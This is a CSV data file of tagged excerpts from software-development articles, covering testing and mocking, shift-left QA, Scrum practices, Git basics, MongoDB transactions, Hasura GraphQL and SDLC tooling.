1827,"One of the most challenging parts of testing is dealing with granularity. On the integrated end of the spectrum, we can write an end-to-end test to drive a web application via Selenium for instance. On the isolated end of the spectrum, we can test a single pure function like so: To the extent we want to to increase granularity, we can approach the problem from the top or bottom of the call stack. For instance, if a() calls b(), we can increase granularity by calling a() and mocking b(). Or we can isolate from the bottom up, by directly calling b(). Suppose b() calls c(); then we can directly call b() but mock c(), thus isolating b() from a() at top, and c() at the bottom.","['JavaScript', 'Tdd', 'Software Testing', 'Extreme Programming', 'Ruby']",14
1828,"If we let the File.delete() call through, itll raise an error No such file or directory. But if we create a file in our test, then we have to add test code to assert it was deleted. One could reasonably complain that, aside from testing that we passed the right args to File.delete(), this bloats our test with duplicative testing of the File.delete() method that we already know works. Note, thats not to say theres anything wrong with testing File.delete(); its just that we dont want to bloat or complicate our test in order to do so. This is a nuanced point thats often missed, and which Ill revisit. Finally, this is all to say nothing of the potential for polluting our filesystem any time we kill a running spec, as well as the additional risk of flaky-spec-inducing collisions when running specs in parallel. The case for mocking the call to File.delete() could not be clearer.","['JavaScript', 'Tdd', 'Software Testing', 'Extreme Programming', 'Ruby']",18
1829,"B. Rainsberger presented Integration Tests are a Scam to an audience at the Agile (North America) conference in Chicago. After some reflection, he rephrased this as Integrated Tests are a Scam. His point was about the unsuitability of tests which integrate multiple interesting behaviors of a system, which is primarily a matter of the combinatorial explosion of code paths as the scope of a test increases, as well as the slow feedback that comes from e.g. exercising our code via a web browser.","['JavaScript', 'Tdd', 'Software Testing', 'Extreme Programming', 'Ruby']",13
1830,"B. Rainsbergers Integration Tests are a Scam. He then expounds on his thesis that isolated tests are good for testing code with few dependencies but many cases or code paths, whereas integrated tests are good for testing code with many dependencies but few paths. If you skip to the 7:20 mark, he further stresses that functional code is inherently isolated, without mocks. Thus if we place our complex code (interesting behaviors in the words of Rainsberger) at the end of the call stack, by extracting its dependencies, we can isolate from the top rather than from the bottom (i.e. via deeper method calls rather than via mocks, as noted above). The practical ramification of all this is that we can get a lot of benefits by isolating complex logic behind a functional core with an imperative shell.","['JavaScript', 'Tdd', 'Software Testing', 'Extreme Programming', 'Ruby']",9
1831,"But suppose a JSON API contains a value like { display_name: Display Name.call(user) }. The Display Name module is used in multiple places and has its own specs. From the perspective of our API, e.g. a Rails controller action, the details of the display name are irrelevant. Its aware only that theres the semantic notion of displaying a user name; it doesnt care about the details of how thats done. Theres a good case for mocking here, so that our specs dont change if the behavior of Display Name.call() changes.","['JavaScript', 'Tdd', 'Software Testing', 'Extreme Programming', 'Ruby']",15
1832,"Now imagine this in a work setting. You are given a piece of software you know nothing about and you are supposed to test it. You have no idea of the process it went through up until that point. Does it take into consideration edge cases? What is the best way for you test it? To prevent scenarios like the one described above, it not only makes sense but is essential to involve testers in the software development process as early as possible. Starting the testing already in the first stages of the timeline, getting early and frequent feedback on software qualitythis is widely referred to as shifting left. The concept is not a new one. Even in the traditional V model afrom todays point of viewsmall shift towards the unit testing level was happening. Then incremental software development came up and testing began to be carried out earlier and more frequently, but still in a fairly strict testing comes after development manner.","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",13
1833,"But how far left can we shift? And how can software quality benefit not only from early testing itself, but from a testers general skill set? And what do I as the tester get out of it? Lets begin by looking at what happens directly to the left of the tester: code is being written. Writing unit and integration tests is a matter of course for many developers nowadays, so weve got that part of testing early covered, right? Wellyes and no (the most German answer ever). Unit and integration tests are fantastic tools to get early feedback on your code quality, so why not make them even better? Im about to throw two buzz phrases at you. Here it comestest-driven development combined with pair programming; the developer and the tester being the pair here. Now, many testers I know (myself included) only have basic programming skills, so Im hearing the cries of But what can I as a tester bring to a pair programming session?","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",13
1834,"And even before implementation begins, testers can get involved. Larger projects in particular require some degree of technical planning in advance. Often there is more than one way to implement a feature, and sometimes two approaches are equally good. But what if one entails much more testing? In my experience, most developers have a good grasp on estimating testing effort. And yet, having a tester participate in technical planning and judging the expected testing effort in detail means a more precise plan and a more accurate prediction about time to market.","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",13
1835,"In this process, both the product owner and the tester can benefit from one-on-one sessions before a topic is presented to the whole team for estimation. I dont know about you, but as soon as I see requirements, I start going through use cases in my head. A testers mind is trained to find weak spots and holes in a specification. Whether its a new feature or the redesign of an existing functionalityexperienced testers often have the broadest domain knowledge within a team and can rattle off 26 edge cases from the top of their heads that the product owner may have missed. Dont get me wrong: This is by no means a pointing out of shortcomings in a team mates work. It is rather drawing attention to possible stepping stones and adding puzzle pieces to make a specification as complete as possible. This early feedback can prevent defects that result from missing or misunderstood information, which in turn makes the testers life a little easier.","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",0
1836,"The other is an informal desk get-together of UX/UI and me with a show and tell of mock-ups and user flows whenever it is needed. Just as in the collaboration with the product owner, I come with a basket full of use cases. With this input, UX/UI has the chance to gain more in-depth insights into the topic at hand, including specific details and any exceptions that may apply. This is especially useful for complex topics where many use cases need to be taken into account. In turn, I am granted an early peek at whats to come and a detailed familiarity with UX/UI specifications that I will test against later on, which eliminates many of the Why was it designed like this? and Did you really intend for it to work this way?","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",0
1837,And there are more ways to feed the inner customer every software tester should nourish. Let testers from other teams test your feature before it goes live. They will have a fresh look at it and spot issues you may have missed. You will learn about other parts of an application and understand business processes better. Ask customer service about feedback they receive. You might find out about problems that no one anticipated.,"['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",13
1838,"Were pretty far left on the software development timeline by now. But we are not quite done yet. We can take shift left testing one step further by becoming the customer and eating our own dog food, as they say. This is obviously not possible with every kind of software, but if it is, I encourage you to use your companys product like an actual customer would. Go through the entire journey of searching, comparing, adding items to our wishlist, leaving and coming back three days later, and finally making a purchase. It makes a huge difference when something is at stake for you personallyyour money, the security of your personal details or the uncertainty of making the right choice. Every time I have done this, I have noticed something where I thought If Isomeone who works with this software on a daily basisfinds it difficult to understand this, how can a new user ever understand it?","['Agile', 'Software Development', 'Software Testing', 'Shiftleft', 'Quality Assurance']",6
1839,"The first thing youll notice in a bake project is the __url__ file. Here is an example project with three dependencies: Picking a configuration language was not easy. There is no commonly used language for build tools, and discussions on what is the best language can get, well, heated. I ultimately decided on JSON, not because Im a big fan of the language, but because:everyone knows how to read & write itit is easy to parse by any programming language I did not want to invent a new language (CMake) or use a full programming language (Premake, Rake)it has been successfully used for a similar use case by NPMPeople have expressed concern about how JSON can get unwieldy for complex projects. Bake however has a mechanism that keeps your project configurations from getting complex: configuration encapsulation.","['Github', 'Coding', 'Development', 'IoT', 'Git']",19
1840,"With configuration encapsulation, a complex configuration like this: Can be turned into this: For more information on how configuration encapsulation works, see: __url__ packages.","['Github', 'Coding', 'Development', 'IoT', 'Git']",15
1841,"When you quickly want to see the results of code changes on, for example, a web page, going back and forth between the code editor, command line, and browser can be annoying. Instead, bake lets you run projects in interactive mode, which automatically rebuilds a project when youve made a change to the code: Currently interactive mode is only used as a development tool. We have some exciting plans for it though, where it can be put to use as a simple service runner that automatically restarts when a dependency is updated! For large projects with lots of dependencies, it can be a pain to manually include all the headers of dependencies, and keep track of where they are. This gets even more tedious when code is refactored and project names are changing, or projects are split up or combined.","['Github', 'Coding', 'Development', 'IoT', 'Git']",9
1842,"So in simple terms, what Transactions allow us to do is group multiple database operations in a way, that either all of them succeed or none of them do. Suppose, we have two users John and Jane. John transfers $10 to Janes account. Lets examine a simplified way of how this action can be stored in the database -Step 1We subtract $10 to Johns account Step 2We add $10 to Janes account What if Step 1 completes successfully but Step 2 fails. Now, John has $10 less but Jane doesnt have $10 added to her account. This is where Atomicity and Transactions come to rescue. Using Transactions, we can make the two steps part of the same atomic operation. So, the changes are persisted in the database only when all the steps succeed otherwise any intermediate changes are rollbacked.","['Mongodb', 'Mongoose', 'Transactions', 'Fintech', 'Credit Management']",8
1843,"You wont see any AWS console screens in this post. Everyone should be doing this and make sure you are version controlling your templates! EDIT January 2019: A update to the above recommendation. Weve found that we have hit certain account limits with the approach above (one of which is Filter Subscription limits). Were now planning using different accounts for different part of our architecture and each environment. So for example, we might have a website-dev, website-production, stockmanagement-dev, and stockmanagement-production accounts.","['AWS', 'Parameterization', 'Serverless']",11
1844,"Probably the most important thing you can do for future you is to NOT have to face such a situation again. If you find that your organisation needs a new Bounded Context to represent some new subdomain, ask yourself many, many times: Can this be broken smaller? While the patterns I have outlined above do help, it is really better to keep your subdomains as small as possible, so if there is any way to split them up, do so. If you hear terms like Web Portal or Billing or Customer Support, be a little concerned. Those are too big to be Bounded Contexts that wont bloat. Keep looking at the problem space and asking questions. There is a strong chance that you can split the subdomain a couple more times.","['Software Architecture', 'Domain Driven Design', 'AWS', 'Azure', 'Google Cloud Platform']",11
1845,"Single words can evoke a whole set of connotations and feelings. In the Agile space, the word waterfall certainly does that. Every language domain, such as an organization or field of practice, has these words or phrases that have a very specific meaning understood by everyone whos part of that group. Sometimes theyre neutral, sometimes positive and sometimes theyre just taboowords you better avoid due to the bad aftertaste or overwhelmingly negative connotations. In a different context or domain, the same word may be completely innocent and neutraljust ask hikers about waterfalls. (In one organization I worked for, you should never mention productivity; otherwise, youd immediately be confronted with visceral reactions and backlash! )For me, I recently developed an aversion to the use of the word assign while working with an Agile team. Its meaning is somewhat innocent on the surface: to allocate (a job or duty) or give work to. But when I heard it being used, it brought back memories of hierarchical organizations and Taylorism in action: A manager or superior gives a specific item of work to an inferior, a direct report, with the expectation that the work be completed within a short or even pre-determined timeframe while holding that person accountable for completing it in accordance with certain standards.","['Agile', 'Language', 'Organizational Culture']",4
1846,"This thinking makes the hair on the back of my neck stand up. At this point, we should have moved past this. On Scrum teams, we have a prioritized backlog the team pulls work from at sprint planning. The team members self-organize around that work and determine how it should be done and who should be involved based on skill set, availability, as well as interest. Kanban teams pull from the ready queue given availability and room within WIP limits. True, theres still work to be done and business priorities, but nobody assigns anything. Its assumed that the people closest to the work are in the best position to determine how it should be done and by whom.","['Agile', 'Language', 'Organizational Culture']",1
1847,"is a deceptively oversimplified yes/no question. In the cloud, the answer is almost always yes. Its kind of like calling a restaurant and asking if they combine ingredients together. But how tasty is the meal? The concept of an integration between two apps is no longer new. What is new is the degree to which these integrations act as true bridges, rather than yet another obstacle to getting your work done.",['SaaS'],12
1848,"OK, lets now look at Scrum. In all kinds of shape and form. Pivotal for Scrum is the following: This is completely in line with the quoted principle of the Agile Manifesto. Still, despite of this, you see many invented practices like: A Hardening Sprint is an additional Sprint to finalize an item before it gets deployed. You can think about activities like regression testing, User Acceptance Testing, additional reviews, finalizing external interface issues. How sure are you that the hardening will take only one Sprint? Sprint Zero entails everything that is deemed required to start a project or to start working on a feature. You want to be well prepared. Things you generally do in a Sprint Zero are:creating a product backlogcreating a release plancreating the architectural designbuilding the architecture (often under the misused name of Architecture Runway)There is a contradiction in a Sprint Zero. It is often used by companies with insufficiently informed leaders, trainers or coaches and where the Waterfall routine is predominant.","['Scrum', 'Serious Scrum', 'Areyouserious', 'Agile', 'Scrum Master']",1
1849,"A Sprint Zero ignores the whole notion of empiricism. It leans towards Big Design Upfront (BDUF) assuming that many things are known upfront. It neglects that Scrum is meant to develop, deliver and sustain complex products. For an example how you can extend your Definition of Done see my post about our yourney to Devops: I wish to specifically mention the misuse of the term Architecture Runway. Many confuse it with Building all the hardware that is expected to be required, neglecting that through empiricism the product including the hardware emerges (organic growth). If you wish to focus your first Sprint(s) primarily on building up hardware, include the complete team in the work. And also deliver a working product, however small it is. Plus: remain focused on the fact that you build the hardware for the existing and upcoming features only. That is, if you wish to use Scrums full potential.","['Scrum', 'Serious Scrum', 'Areyouserious', 'Agile', 'Scrum Master']",1
1850,Scrummerfall is not leaning towards BDUF. Scrum is not suitable for this way of working. Everything that can be said about Sprint Zero applies to Scrummerfall. The obvious issue with this approach is that only after a number of Sprints you receive feedback on the value of the product. What if the response is negative? Months of work down the drain? No transparency results into no opportunity to inspect and therefore no opportunity to adapt.,"['Scrum', 'Serious Scrum', 'Areyouserious', 'Agile', 'Scrum Master']",1
1851,"Will your product hardly change in time? Are the requested increments straightforward and clearly understood by the team and all the stakeholders? Maybe Scrum is not suited for you. Or any Agile way of working for that matter. However, I highly doubt there are that many software environments with this characteristic.","['Scrum', 'Serious Scrum', 'Areyouserious', 'Agile', 'Scrum Master']",1
1852,"Starting from the first photo it finds an acceptable break point at index 2, with a cost of 114. It then finds another acceptable break point at index 3 with a much higher cost of 9483. It now needs to check those two new indexes (2 and 3) for where they could break. From 2 it finds 5 and 6, and at this point the shortest path for 6 is back via 2 (114 + 1442 = 1556) so it marks it. When photo 3 finds a path to 6 we check the cost again, but because it was so expensive to get to 3 initially, the total cost (9483 + 1007 = 10490) means that 6 keeps its allegiance to 2. Towards the end of the animation you can see that the first path to 11 was non-ideal and switches when node 8 is considered.","['Web Development', 'Google Photos', 'Photography', 'Grid Layout', 'Web Performance']",14
1853,"The huddle should be done as close to where the actual work is done as possible. This is what is known as the Gemba, the place where the value is being created. They should also be done around some form of Huddle board The Huddle Board: The Huddle Board is the centrepiece, in my experience, of driving successful teams daily. Its a board, perhaps a chalkboard, whiteboard or an electronic dashboard (for a remote team), that visually communicates in a simple way what the team set out to achieve and what they did achieve. The goal is to develop a visual communication tool that allows key performance metrics to be communicated quickly. Not only does this drive efficiency within the team but also clarity.","['Teamwork', 'Morning Routines', 'Business', 'Communication', 'Management']",1
1854,"The first part of the meeting is to review yesterday performance. In yesterdays meeting you would have planned to achieve something and set out some targets and some goals. This might have been to phone 15 clients or to ship every order that was received online. What is key, is to have a look at the plan that was sent out. And then ask How did we do against the plan? So if we set out to phone the 15 clients, did we manage to do it? Did we ship every order that was received online or did we have some holdover that we failed to send out due to a system error? Perhaps we received a lot more orders than expected and we did not have enough resources to meet the demand.","['Teamwork', 'Morning Routines', 'Business', 'Communication', 'Management']",0
1855,"Im working on a social networking app. I just added a tab that will allow people to see their connections in the app. This required changes in several files in my project. Ive made those changes and saved all of the files. Now, I can commit these new changes to Git. Ill run git commit -am ""Adds connections tab"" to stage (more on that later) and commit all changes. The -am options are for adding all unstaged changes to the stage and providing a message for the commit respectively.","['Git', 'Programming', 'Software Development', 'Web Development', 'Version Control']",18
1856,"The best way to install Git on the Mac is using the Homebrew package manager. If you have Homebrew installed, you can run brew install git in your terminal. Once thats done, you can run git from the terminal to confirm the installation worked. Homebrew On Windows, you can download the Git installer from the Git downloads page. The Windows installer should install Git-Bash which gives you a shell command line in Windows. (Youll use this the same way you would use the terminal of a Mac or on Linux.d Most Linux distributions will have Git available in their default package repositories.","['Git', 'Programming', 'Software Development', 'Web Development', 'Version Control']",7
1857,"Create a text file in the root directory of your project named.gitignore. (Take the note of the leading dot. This makes the file invisible so that it doesnt clutter up your directory listings. If you leave it out, Git wont know what to ignore.) This is just a standard text file. Each line is a file pattern. Git will ignore any files matching any of these patterns.","['Git', 'Programming', 'Software Development', 'Web Development', 'Version Control']",18
1858,"These patterns are the same kinds of patterns you use in other terminal commands. Maybe youve deleted all the text files in a directory by using rm *.txt. They can have wildcards (like *) that match anything, or they can simply be the name of a file or directory (like node-modules). If you want to know more about the.gitignore file, check out the Git documentation. Which Files to Ignore Heres an example.gitignore file from a Gatsby JS project:node_modules is ignored because its where dependencies are installed. public gets ignored because thats where the project gets built.","['Git', 'Programming', 'Software Development', 'Web Development', 'Version Control']",18
1859,"Now that you have your project in place, youll start going through the Git loop. Heres what it looks like: Make your changes Save them Stage your changes with git add Commit changes with git commit Repeat Youll occasionally run git status to make sure everything is tracked and staged as youd expect, but, otherwise, this is the bulk of your Git life as a web developer. You dont know everything youll ever need to know to use Git (You cant even revert changes which is core to the value of version control. ), but you probably wont need to do anything else for a while. When that time comes, use your search skills to find the commands to accomplish the task in front of you. (Its one of my core principles of becoming a web developer: learn what you need to know just in time! )Your challenge for now is to build a habit around using Git even when you dont need to. Youll need to be using Git when you really screw something up, but, once that has happened, it will be too late to start using it.","['Git', 'Programming', 'Software Development', 'Web Development', 'Version Control']",18
1860,"We have three main APIs that are separated by functionality. The architecture consists of the following components: The API layer is what provides embeddings, or vector representations of the images. Its latency is in 99th percentile 856 ms. This is a light wrapper HTTP API on top of Tensor Flow serving. The whole endpoint is a few lines of Python: The API layer is what actually searches an embedding across a database of embeddings. We use FAISS for our image database, and its very fast (latency: 60 ms70ms)! For a given image embedding, it returns the closest image embedding indices: Here, FAISS searches the closest embeddings to the original anchor embedding. After finding the closest embeddings, we then fetch the product indices from the FAISS index and fetch product information to pass this data to Hayneedle (very similar to vector similarity comparison).","['Machine Learning', 'Software Engineering', 'Visual Search', 'Deep Learning', 'Computer Vision']",14
1861,"Its working for us so far, and wed love your perspective as we develop it further. We use it in conjunction with learning experiences, but think it can stand on its own too. Please leave any suggestions in the comments. Tech people and emoji people are all welcome here. Some specific questions: Do you want others? Are there other Machine Learning-type words youd want cards for? Right now we have three types of card per algorithmtext explanations, sketches, and questions you might be asking that would indicate you need that type of algorithm. We have activities where you play different algorithm cards at different moments, but we think they have other uses too. Do you see them as a desk reference? Want them to be a standalone game? Thanks in advance for your feedback. Ill try to be funnier next time.","['Machine Learning', 'Design', 'Design Thinking', 'Data Science', 'Artificial Intelligence']",6
1862,The full deck will be available very soon. Want to know when it lands? *Some basic definitions if needed: Machine Learning (ML): Computer code that does things that humans do. It learns and gets better with time. Machine Learning is a subset of Artificial Intelligence (AI). Some people use the words interchangeably. Its just a way of analyzing data.,"['Machine Learning', 'Design', 'Design Thinking', 'Data Science', 'Artificial Intelligence']",5
1863,"Getting Set Up Every step of this holistic model requires all stakeholders to take part in it. The team wants to build a project through the eyes of the end-users they are targeting. There are two layers of people you have to consider at this point. The first is the customer and the second is the end-users. Sometimes they are one in the same but often they are not. Understand both sides and bridge the gap between customer wants and end-user needs. The closer you bridge this gap, the higher your chances of end-user wide adoption.","['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",1
1864,End-User Needs End-users are the ones who use software products. They expect a software to solve their problem while delivering a great experience. The software professional needs to understand this basic principle. Software alone can only get so far without delivering an engaging experience. End-users are much more sophisticated today than they were two decades ago. They can distinguish between mediocre and awesome products. Great software products deliver great experiences.,"['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",16
1865,Customer Wants A customer in this context is the one who hires a professional to build a software product. The professional is the one who guides the software development process. It should never be the other way around. Customers have innate misconceptions about the software development process. It is very important to educate them and show them the way. The professional should expect the customers expectations to be out of line. It is never fair to assume the customer will understand the complexity of the work. This is the job of the software development professional. You need to take the customers hand and teach them about the process in a way they can understand. It is not always easy but it is necessary.,"['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",0
1866,The Importance of Asking Questions Asking plenty of questions allows the software professional to get the real picture. This is where well-structured surveys go a long way. I use Google Forms to create my surveys. Surveys help to identify particular pains about a process or a product. A professional builds software solutions off of these pains. Surveys allow you to get deep inside the end-users pain. Many people are more likely to fill out a survey than to express their opinions in person. The same goes for suggestions and improvements. This is even more evident in an enterprise environment where end-users are employees. They provide real insight without major implicationsregardlesss of who the end-users are. The purpose is to hear from those who may use your software.,"['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",0
1867,"Segment Needs and Wants Keep on asking lots of questions and divide them by end-user needs and customer wants. These two should intersect at every point in a perfect world. This process creates a strategy around needs rather than wants. For instance, if you are going to build an accounting tool. The questions should be on pains around the end-users current accounting system. Everyone has a system even if they think they dont. Pen and paper are part of a system. Many companies still run on it nowadays. It is crucial the new experience is greater than its legacy system. This helps set stage for wide end-user adoption. If the end-user loves the product, the customer will love your work.","['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",0
1868,"Value Creation Opportunity This is the point where you get to be a hero for your customer as a software professional. This is where you get to create real value for them. If you cannot take on your customers problem, you can still deliver value. You could recommend a pre-existing tool or refer the job out to a strategic partner. In fact, carry them the rest of the way if you can. This is one of the best strategies I know. You will stay top-of-mind, develop rapport and gain trust. This move alone can open doors to referrals and future opportunities.","['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",0
1869,"The Copy and Paste Story I once had a potential customer who wanted me to build him a software product. He wanted to replicate a product by a Fortune 500 company. This was way before I was using surveys as the first step in qualifying my prospects. We met at his office and he asked me in front of his staff to copy and paste this software for him. I thought he was joking at first, but he was dead serious. He said, Im not sure how it all works but you know what I mean. I asked him, how long he thought it would take, and he responded, a couple of days maybe? I asked him what was his budget and he said no more than $500. I explained to him that the process to develop such software was not as easy of copying and pasting. I took the time to explain to him the development process and its implications. He was set on his ways and assured me this could not be that difficult as I was explaining it to him. It was then that it was very clear to me his wants were not aligned with his needs. I suggested a possible solution that would fit his budget. I told him about an out of the box commercial software suite that was selling for a similar amount. He was happy with the advice and I was on my way. The entire exchange took a few minutes of my time. It allowed me to deliver value and spared both of us from future headaches. This exchange taught me to value the Nos as much as the Yeses. A No clears the way for you to focus on a good Yes down the line.","['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",2
1870,"Conclusion This discovery process is my secret weapon. It gives me the competitive advantage I need to vet my projects. Not all the development opportunities are the right fit. The minute you commit to do the impossible you are on the hook. The customer has the power to hire, but you have the power to execute. If it is not a good fit, you must quit before you even begin. This is where you get to pull your binoculars from the shore and avoid the iceberg route. This foresight allows you to lead with honesty. This is what creates trust, stronger relationships and builds rapport. The discovery process is my most powerful tool because it allows me to stay true to my process and my values.","['Product Management', 'Software Architecture', 'Software Development', 'SaaS', 'System Analysis']",4
1871,"In this post, I will show you how you can create effortless real-time Graph QL API with serverless business logic and deploy it to any cloud. Sounds a bit like a click-bait title right? You may assume that we will create your own Graph QL server if you are familiar with Graph QL or you have heard about it and always wondered, what it is and how do I start writing Graph QL servers. Also, you may assume that we will be dealing with cloud deployments, serverless functions.","['GraphQL', 'Serverless', 'Hasura', 'Software Development', 'Cloud Computing']",6
1872,"Well, Effortless is the key word here. It is super simple to set up and run your own Graph QL API in any cloud of your choice on top of existing Postgres or its extensions. And no we wont be setting up servers and talking about cloud deployments. In this blog post, I will explain most of the feature set of H __url__ open source engine and how it brings you Real-time Graph QL API without creating your own server. We will see how to navigate through its features to give you an in-depth overview and use cases for using it even with your existing server, non-Postgres database or serverless functions.","['GraphQL', 'Serverless', 'Hasura', 'Software Development', 'Cloud Computing']",6
1873,"Now the only thing that is left is to go to http://localhost:8080/console to see Its possible also to run Hasura engine on top of an existing Postgres database. For that, instead of getting docker-compose as we did previously, we get __url__ script from install-manifests repo and edit HASURA_GRAPHQL_DATABASE_URL variable. You can read more about it here Totally possible. there are a couple of awesome blog posts about using Post GIS (spatial database extender for Postgres) with Hasura Or using Hasura with Time Scale DB (open source time-series database with full SQL support)Running on Firebase? not a problem check out firebase2graphql tool. Using mongo or any other No SQL database? You can export JSON dump and use json2graphql tool to import your data into Postgres database through Hasura engine.","['GraphQL', 'Serverless', 'Hasura', 'Software Development', 'Cloud Computing']",8
1874,"Whenever you do that, you will be able to run a query like this: In Hasura engine we can define roles and permissions and get to a really granular level. We can, for example, allow access to a specific column only if a specific rule is met. We also can pass variables to from our custom authentication webhook and define custom access based on it. In console it looks like this: In this example, we check if provided X-HASURA-USER-IDHasura engine supports various types of authentication. You can use JWT Token, your custom token or Hasura-access-key. What happens under the hood is the following: Authorization layer checks for secret key token/JWT config or webhook config.","['GraphQL', 'Serverless', 'Hasura', 'Software Development', 'Cloud Computing']",15
1875,"Out of curiosity, I decided to scaffold a React project using the dotnet new cli. To my surprise, the React templates dependencies were more or less completely up-to-date. Digging deeper, I found the cause of this discrepancy: Microsoft ended official support for V __url__ back in February, with Steve Sanderson stating the following: Source: __url__ ones.","['Programming', 'Web Development', 'Microsoft', 'Technology', 'JavaScript']",15
1876,"Microsoft has provided increasing levels of support for Vue elsewhere in its ecosystem. Vue is well supported in VS Code and is receiving higher levels of attention in Visual Studio. What Im asking for, though, is for Microsoft to pick Vue back up as an officially supported front-end framework, just like Angular and React. Specifically, to upgrade and continue support of its Spa Templates package, as well as adding an official Vue template within Visual Studio itself (to be accessed when creating a new project/solution). Additional documentation and examples for Java Script Services as a whole wouldnt hurt, either.","['Programming', 'Web Development', 'Microsoft', 'Technology', 'JavaScript']",19
1877,"The final note Ill make on running the project also concerns IIS. When running through IIS, the project is configured to use vue-clis build process, and then listen on port 8080 for the built project. Sometimes this process doesnt go as planned. If you encounter errors describing a timeout, close the window and run IIS again. This is a pain, but the project will typically load, complete with HMR, on the second or third attempt. This is a known issue that isnt unique to vue-cli, and there may be workarounds (though none have worked for me to date).","['Programming', 'Web Development', 'Microsoft', 'Technology', 'JavaScript']",18
1878,"Only recently have I started to realize that each attempt at transparency has suffered from a lack of vision and cohesion. Its a classic forest for the trees problem of implementing a singular solution to solve an immediate problem without understanding how it fits into a larger ecosystem. When we collected build event data, we sent it straight to a database because that was the tactical need. When we linked commits with defects, we configured the source control system to talk directly to the bug tracking system because that was the tactical need. After years of making incremental improvements in transparency, I feel I can take a step back and reflect on the forest. I hope that by talking about the variety of tools that comprise the Software Development Lifecycle (SDLC), you as the reader can agree that visibility matters.","['Software Development', 'DevOps', 'Operations', 'Apache Kafka', 'Sdlc']",13
1879,"When I talk about SDLC, Im referring to the process of producing software. Im referring to the collection of applications that facilitate software production. Its requirements tracking, source control, continuous integration, bug tracking, and test case management. Ideally these applications all function together to provide greater transparency and traceability. There are commercial solutions such as IBM Jazz (formerly Rational) or HP ALM, but these can be incredibly expensive, difficult to implement, and seldom provide the best user experience. The goal should be to create a loosely coupled system where applications can be added or removed quickly, or even run in parallel, as the needs of the organization change.","['Software Development', 'DevOps', 'Operations', 'Apache Kafka', 'Sdlc']",12
1880,"Although software development is not a uniform process across all teams, there needs to be a high degree of transparency and traceability throughout the process. Even within a single company, different projects or organizations may have different needs. Developer requirements, corporate acquisitions, and process evolution can all result in a multitude of overlapping applications and tools. Standardization is ideal, but seldom achievable. The solution to that problem is information sharing. The idea that applications should expose all their events in an open and transparent manner is what Ill refer to as transparent SDLC.","['Software Development', 'DevOps', 'Operations', 'Apache Kafka', 'Sdlc']",12
1881,"High availability Applications will constantly be producing and consuming messages. Any outage or disruption may result in a loss or delay of data. The streaming platform must be designed with clustering and high availability in mind. Even upgrades of the platform itself must be possible without requiring an outage or downtime. When the message platform is highly available, it takes the burden off of the consumers to be highly available as well. Consumers can be taken offline for brief periods of time for upgrades or maintenance and can catch up on missed messages when they come back online.","['Software Development', 'DevOps', 'Operations', 'Apache Kafka', 'Sdlc']",17
1882,"The task of establishing a streaming platform just to support your software development process may seem like a daunting and overly complex approach. But you dont have to implement it all at once. Start by collecting logs and surfacing the data through Elasticsearch and Kibana. Next select a core application such as source control and begin emitting events, then tackle a use case such as establishing links between defects and commits. Once you are able to demonstrate the application of the technology, there will be multitude of opportunities to expand on its use. And the great part of the streaming platform approach is that it allows subject matter experts to take control of their own applications. The ability to integrate applications and increase transparency is no longer dictated by plugin availability or vendor support, it is available to anyone who can imagine a better way to connect the dots.","['Software Development', 'DevOps', 'Operations', 'Apache Kafka', 'Sdlc']",10
1883,"Every project exists to fulfill a need, and until you understand that need, you cant make a successful plan, much less build an application to satisfy it. Moving forward without understanding the projects goals is like trying to play darts with your eyes closed. You might be really good, but you have no idea what youre aiming for. It sounds basic, but its so often overlooked that I feel the need to point it out here. Tell me youve never seen this scenario: Manager: We need a micro-service framework built in COBOL that reads XML from a SOAP service and translates it into UTF-8 encoded Swahili before it increments a hexadecimal counter in a brand new No-SQL database and displays the total on our website using non-standard emoji. ]We engineers tend to take the spec doc at face value. In default mode, well usually just put our heads down, turn up the music, and start building something without ever asking questions like, Why are COBOL and Swahili even required? Sometimes we can get away with that. If the project is small and were lucky.",['Programming'],9
1884,"When youre hunting for these unidentified questions, remember that the devil is almost always in the details. If, for example, the spec calls for a blog with a commenting system, I can almost guarantee that one or more of the following questions has not been answered: Must users authenticate before commenting? And if so, have we accounted for how that will happen? Are we integrating with any social APIs to allow people to authenticate using, say, their Facebook or Twitter account? Do individual comments need approval before appearing on the public site? If so, does that apply to all commenters, or just some? Do we need to create an admin interface or administrative user role to support comment approval? Can comments be turned off for a post before it goes public? What about for a post that is already public? And if a post already has public comments, what happens if we turn off commenting then? Do the existing comments disappear, or do we just remove the comment creation form? Can commenters reply to existing comments? If so, how deep can a reply thread go? Have we accounted for nested comments in design across all screen sizes? Do we have a plan for dealing with inappropriate/abusive language in comments and/or problem commenters? That list could go on and on. Every question you ask can, potentially, unearth several more questions that need to be asked. It can be daunting, I know. Its tempting to skip this step, make assumptions, and get something out the door, but you know what happens when we assumebad things, man. So take the time to really think through the projects requirements and figure out which decisions still need to be made before you start your build.",['Programming'],19
1885,"Once you have most of your questions answered (because lets be honest, youll never get all of your questions answered up front), you can start to organize your plan. Are there database changes to be made? Create a document called Database Changes, add a bullet point or two to summarize what the changes will need to accomplish, and set aside some time on your schedule to think through specifics later (in step 4). What are the modules/classes that will need to be modified or created? Are there pieces that will depend on other teams? Note them, and communicate these requirements to the affected teams or your PM. For each piece you or your team will need to build, make a rough, high-level outline of what will need to be accomplished. Sometimes this will send you back to step 2 with fresh questions, and thats fine. Surface them, and move on to the next functional piece.",['Programming'],0
1886,"Make a list (and check it twice) of every task (naughty or niceokay, Ill quit now) that will need to be accomplished to complete the functional pieces you just outlined. They dont have to be listed in order of execution as long as you feel everything is covered. When youre done, you should have something that looks like this: Create a database table to store comments. Should include a unique ID, the date/time the comment was posted, the ID of the post being commented upon, the commenters user ID, the ID of the comment being replied to if applicable, and the text contents of the comment. Be sure to follow our organizational standards and naming conventions.",['Programming'],15
